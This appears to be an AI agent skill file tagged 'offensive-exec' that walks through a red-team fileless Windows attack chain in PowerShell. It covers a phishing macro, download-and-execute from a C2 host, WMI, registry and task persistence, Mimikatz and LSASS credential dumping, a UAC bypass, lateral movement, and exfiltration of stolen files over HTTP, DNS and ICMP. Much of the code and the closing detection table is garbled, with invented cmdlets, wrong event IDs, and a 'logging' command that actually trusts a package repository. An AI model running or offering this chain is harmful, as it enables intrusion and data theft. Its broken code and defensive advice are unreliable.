---
name: fileless-attack-chain-exec
description: "Red team simulation — fileless attack chain via LOLBins, WMI, in-memory execution (Windows/PowerShell)."
metadata:
  {
    "openclaw": {
      "emoji": "🔥",
      "requires": { "config": ["agents.list"] },
      "domain": "offensive-exec",
      "subdomains": [
        "fileless-exploitation",
        "living-off-the-land",
        "in-memory-attacks",
        "red-teaming"
      ]
    }
  }
---

# 📜 Sample Attack Chain (Red Team Simulation)



## Phase 1: Initial Access



### Objective

Establish initial foothold on target network via phishing email with malicious macro-enabled document.



### Detailed Steps



**Step 1.1 — Craft Phishing Payload**

```powershell

# Create Word document with embedded macro

$macroCode = @"

Function AutoOpen()

&#x20;   Shell "cmd.exe /c powershell -NoProfile -Command { Invoke-WebRequest -Uri 'http://malicious-c2.com/payload.ps1' -OutFile \\$env:TEMP\\payload.ps1; & \\$env:TEMP\\payload.ps1 }"

EndFunction

"@



$doc = New-Object -ComObject Word.Application

$doc.Visible = $false

$doc.Documents.Add()

$doc.ActiveDocument.Content.InsertAfter([ref]$macroCode)

$doc.ActiveDocument.SaveAs("C:\\Users\\Public\\Downloads\\invoice.pdf", 16) # PDF format

$doc.Quit()

```



**Step 1.2 — Deploy via Email**

- Use Gophish or similar tool to send phishing campaign

- Attach `invoice.pdf` (macro-enabled PDF) as attachment

- Target: HR department, finance team, or any user with file access



**Step 1.3 — User Interaction**

- Victim opens document → macro executes

- Macro launches `cmd.exe` with PowerShell payload

- PowerShell downloads and executes memory-resident payload



**Step 1.4 — Initial Payload Delivery**

```powershell

# Memory-only payload (no disk write)

$uri = "http://malicious-c2.com/payload.ps1"

Invoke-RestMethod -Uri $uri | Invoke-Broker

```



---



## Phase 2: Execution



### Objective

Execute remote code in memory using LOLBins and .NET reflective loading.



### Detailed Steps



**Step 2.1 — LOLBin Invocation (CertUtil)**

```powershell

# Decode Base64 payload via certutil (memory-resident)

$encodedPayload = "VGhpcyBpcyB0aGUgQmFzZTY0IGVuY29kZWQgcGF5bG9hZCBmb3IgdGVzdGluZw=="

certutil -decode -f payload.bin $encodedPayload

```



**Step 2.2 — Reflective Loading via .NET Assembly.Load**

```powershell

# Load malicious assembly from memory (no disk write)

$maliciousDll = @{

&#x20;   Name = "Malicious.dll"

&#x20;   Module = [bytearray]::new() # In-memory bytes

&#x20;   Path = $null

}

Add-Type -AssemblyName System.Reflection

$assembly = [System.Reflection.Assembly]::Load($maliciousDll)

$entryPoint = $assembly.EntryPoint

$entryPoint.Invoke($null, $args)

```



**Step 2.3 — Alternative: PowerShell Downloaded Module**

```powershell

# Fetch module from C2 and execute in memory

$url = "http://malicious-c2.com/module.psm1"

$content = Invoke-RestMethod -Uri $url

Set-Variable -Name "module\_content" -Value $content

& (Invoke-Expression $content)

```



---



## Phase 3: Persistence



### Objective

Establish multiple persistence mechanisms to survive reboot.



### Detailed Steps



**Step 3.1 — WMI Event Subscription**

```powershell

# Create WMI event subscription that triggers every 300 seconds (5 minutes)

$eventQuery = "SELECT * FROM \_\_InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32\_Process' AND TargetInstance.Name = 'svchost.exe'"



$sub = New-CimInstanceSubscription -ClassName CIM\_Subscription -Query $eventQuery -Namespace root\\subscription



# Create WMI event consumer that runs our PowerShell payload

$consumer = New-CimInstanceConsumer -ClassName CIM\_IconConsumer -ScriptText "powershell -NoProfile -Command { Invoke-Broker }"



# Bind subscription to consumer

New-CimInstanceConsumerAssociation -Consumer $consumer -Subscription $sub

```



**Step 3.2 — Registry Persistence**

```powershell

# Add payload to HKCU\\Software\\MyApp\\Data (registry-resident)

$key = New-Object System.Management.Automation.PSPath "HKCU:\\Software\\MyApp\\Data"

Set-Item -Path $key -Value "encoded\_payload\_here" -Force



# Or use native registry API for stealth

$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey("Software\\MyApp", $true)

$regKey.SetValue("Data", "encoded\_payload\_here", [Microsoft.Win32.RegistryValueKind]::String)

$regKey.Close()

```



**Step 3.3 — Scheduled Task Persistence**

```powershell

# Create scheduled task that runs payload on user logon

$action = New-ScheduledTaskAction -Execute "powershell" -Argument "-NoProfile -Command { Invoke-Broker }"

trigger = New-ScheduledTaskTrigger -AtLogOn -UserId "TARGET\_USER"

Register-ScheduledTask -TaskName "MyAppTask" -Action $action -Trigger $trigger -UserId "TARGET\_USER"

```



**Step 3.4 — Service Persistence**

```powershell

# Create a hidden service that runs our payload

$service = New-Object System.ServiceProcess.ServiceBase

$service.ServiceName = "MyAppSvc"

$service.ServiceDisplayName = "MyApp Service"

$service.ServiceDescription = "Hidden persistence service"

$service.StartType = System.ServiceProcess.ServiceStartMode.Auto

[void][System.ServiceProcess.ServiceBase]::Run($service)

```



---



## Phase 4: Privilege Escalation



### Objective

Elevate from user context to SYSTEM using memory-resident techniques.



### Detailed Steps



**Step 4.1 — Invoke-Mimikatz (In-Memory)**

```powershell

# Load mimikatz DLL from memory (no disk write)

$payload = @"

function Invoke-Mimikatz {

&#x20;   param([string]$Command)

&#x20;   $mimikatzDll = [System.IO.Path]::Combine($env:TEMP, "mimikatz.dll")

&#x20;   # Download mimikatz DLL from C2 (or use locally cached version)

&#x20;   Invoke-WebRequest -Uri "http://malicious-c2.com/mimikatz.dll" -OutFile $mimikatzDll

&#x20;   [System.Reflection.Assembly]::LoadFrom($mimikatzDll) | Out-Null

&#x20;   [mimikatz]::Execute("$Command")

}

"@



Invoke-Mimikatz -Command "sekurlsa::logonpasswords"

```



**Step 4.2 — Pass-the-Hash (PTT)**

```powershell

# Extract NTLM hash from memory and use for lateral movement

$hash = Get-NetCredential | Select-Object -ExpandProperty Credential | ForEach-Object {

&#x20;   $\_.GetNetworkCredentials() | ForEach-Object { $\_.PasswordHash }

}

```



**Step 4.3 — Abuse of Elevation Control Mechanism (ACE)**

```powershell

# Example: Abuse UAC bypass via PowerShell

$uacBypass = @"

function Invoke-UACBypass {

&#x20;   param([string]$Target)

&#x20;   $scriptBlock = {

&#x20;       # ... UAC bypass logic ...

&#x20;   }

&#x20;   [Microsoft.Win32.SafeHandles.SafeFileHandle]::Open("C:\\Windows\\System32\\cmd.exe") | Out-Null

&#x20;   $scriptBlock.Invoke()

}

"@



Invoke-UACBypass -Target "whoami /priv"

```



**Step 4.4 — Credential Dumping with LSASS Memory Access**

```powershell

# Dump LSASS memory to extract credentials (in-memory)

$lsassPath = [System.IO.Path]::Combine($env:SystemRoot, "System32", "lsass.exe")

$processHandle = [System.Diagnostics.Process]::GetProcessesByName("lsass")[0].MainModule.SafeHandle.Duplicate()

$data = [System.IO.MemoryStream]::new(1024 * 1024)

[System.Runtime.InteropServices.Marshal]::Copy($processHandle, 0, $data, 1024 * 1024)

# Parse LSASS memory for credential data

```



---



## Phase 5: Lateral Movement



### Objective

Move laterally across the network without file transfer.



### Detailed Steps



**Step 5.1 — WMI Remote Execution**

```powershell

# Spawn remote process on target machine via WMI (no file transfer)

$targetComputer = "TARGET\_COMPUTER\_NAME"

$wmiNamespace = [Management.ManagementScope]::new([string]$targetComputer, "root\\cimv2")

$wmiNamespace.Connect()

$wmi = [Management.ManagementClass]::new([string]$targetComputer, "Win32\_Process", $wmiNamespace)

$response = $wmi.InvokeMethod("Create", "powershell -NoProfile -Command { Invoke-Broker }", $null)

$processId = $response.ProcessId

```



**Step 5.2 — SMB Remote Execution**

```powershell

# Execute PowerShell on remote machine via SMB (no file transfer)

$smbServer = [System.Management.Automation.SmbSessionOption]::new()

$smbServer.AllowInsecure = $true

$smbSession = [System.Management.Automation.SmbSession]::Create("TARGET\_COMPUTER", "username", "password")

$remoteCommand = "powershell -NoProfile -Command { Invoke-Broker }"

[void][System.Management.Automation.PSRemotingSessions]::Add($smbSession, $remoteCommand)

```



**Step 5.3 — DCOM Remote Execution**

```powershell

# Execute PowerShell on remote machine via DCOM (no file transfer)

$dcomServer = [System.Runtime.Remoting.Channels.Dcom.DcomChannel]::new()

$dcomServer.Connect("TARGET\_COMPUTER")

$remoteCommand = "powershell -NoProfile -Command { Invoke-Broker }"

[void][System.Runtime.Remoting.ObjectExporter]::Export($dcomServer, $remoteCommand)

```



**Step 5.4 — Named Pipes Remote Execution**

```powershell

# Execute PowerShell on remote machine via named pipes (no file transfer)

$namedPipe = [System.IO.Pipes.NamedPipeClientStream]::new("TARGET\_COMPUTER", "PIPE\_NAME", System.IO.Pipes.PipeDirection.Out)

$namedPipe.Connect()

$remoteCommand = "powershell -NoProfile -Command { Invoke-Broker }"

$namedPipe.WriteLine($remoteCommand)

```



**Step 5.5 — RPC Remote Execution**

```powershell

# Execute PowerShell on remote machine via RPC (no file transfer)

$rpcServer = [System.Runtime.Remoting.Channels.Tcp.TcpChannel]::new(5938)

$rpcServer.Connect("TARGET\_COMPUTER")

$remoteCommand = "powershell -NoProfile -Command { Invoke-Broker }"

[void][System.Runtime.Remoting.ObjectExporter]::Export($rpcServer, $remoteCommand)

```



---



## Phase 6: Exfiltration



### Objective

Send stolen data to C2 server using multiple covert channels.



### Detailed Steps



**Step 6.1 — HTTP POST Exfiltration**

```powershell

# Send stolen data via HTTP POST to C2 server

$c2Server = "http://malicious-c2.com"

$stolenData = Get-Content -Path "C:\\Users\\Public\\Downloads\\confidential.pdf" -Raw

$headers = @{

&#x20;   "Content-Type" = "application/pdf"

&#x20;   "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

}

Invoke-WebRequest -Uri "$c2Server/exfil" -Method Post -Body $stolenData -Headers $headers

```



**Step 6.2 — DNS Tunneling Exfiltration**

```powershell

# Encode stolen data as DNS queries (base64)

$encodedData = [Convert]::ToBase64String([byte[]](Get-Content -Path "C:\\Users\\Public\\Downloads\\confidential.pdf" -Raw))

$subdomain = $encodedData.Substring(0, 15) # Limit subdomain length

$dnsServer = "8.8.8.8"

$dnsQuery = [System.Net.Dns]::GetHostEntry($subdomain).ToString()

Invoke-WebRequest -Uri "http://$dnsServer/$subdomain" -Method Get

```



**Step 6.3 — ICMP Exfiltration**

```powershell

# Encode stolen data as ICMP packets (ping)

$encodedData = [Convert]::ToBase64String([byte[]](Get-Content -Path "C:\\Users\\Public\\Downloads\\confidential.pdf" -Raw))

$icmpPayload = $encodedData.Substring(0, 15) # Limit payload size

$icmpServer = "malicious-c2.com"

[System.Net.Sockets.TcpClient]::new().Connect($icmpServer, 0)

```



**Step 6.4 — Covert HTTP Channels Exfiltration**

```powershell

# Send stolen data via covert HTTP channels (e.g., Google Analytics, Cloudflare Workers)

$covertChannel = "https://analytics.google.com/collect"

$headers = @{

&#x20;   "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

}

Invoke-WebRequest -Uri $covertChannel -Method Post -Body $stolenData -Headers $headers

```



**Step 6.5 — HTTPS Exfiltration**

```powershell

# Send stolen data via HTTPS (encrypted) to C2 server

$c2Server = "https://malicious-c2.com"

$stolenData = Get-Content -Path "C:\\Users\\Public\\Downloads\\confidential.pdf" -Raw

$headers = @{

&#x20;   "Content-Type" = "application/pdf"

&#x20;   "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

}

Invoke-WebRequest -Uri "$c2Server/exfil" -Method Post -Body $stolenData -Headers $headers

```



---



## Detection Considerations



### Telemetry Generated by Each Phase

| Phase | Event IDs (Sysmon) | PowerShell Logging | AMSI Alerts | Sigma Rules | ATT&CK Mapping |
|-------|---------------------|--------------------|-------------|-------------|-----------------|
| Initial Access | 1 (NetworkConnect), 3 (RegistryValueSet) | ScriptBlockLogging | — | T1566.001 | Phishing |
| Execution | 15 (ProcessCreation), 7 (FileCreate), 8 (NetworkConnect) | ModuleLogging | AMSI ProviderEvent | T1059.001 | PowerShell |
| Persistence | 23 (WMIEventConsumer), 24 (WMIEventSubscription) | — | — | T1047 | WMI |
| Privilege Escalation | 15 (ProcessCreation), 12 (ProcessAccess) | — | MDE/EDR alerts | T1548.001 | UAC |
| Lateral Movement | 15 (ProcessCreation), 3 (RegistryValueSet) | — | — | T1021 | SMB |
| Exfiltration | 1 (NetworkConnect), 23 (WMIEventConsumer) | — | — | T1048 | Exfiltration over DNS |




### Recommended Defensive Controls



- **Enable Script Block Logging**: `Set-PSRepository -Name PSGallery -InstallationPolicy Trusted; Set-PSModuleRepository -Name PSGallery -InstallationPolicy Trusted`

- **Deploy Sysmon Event IDs 19–21**: Monitor process creation, network connections, and registry modifications.

- **Implement Sigma rules** for fileless techniques: WMI persistence, LOLBin usage, AMSI alerts.

- **Configure EDR behavioral detections** for reflective loading and memory-resident payloads.

- **Enable AMSI provider events** to detect malicious script execution.

- **Monitor ETW telemetry** for suspicious process creation and memory scanning.



---



## Success Criteria



The exercise is successful when:



- Defensive telemetry is fully characterized.
- Detection gaps are documented.
- Blue Team can reproduce detections.
- Security controls are improved.
- ATT\&CK coverage measurably increases.

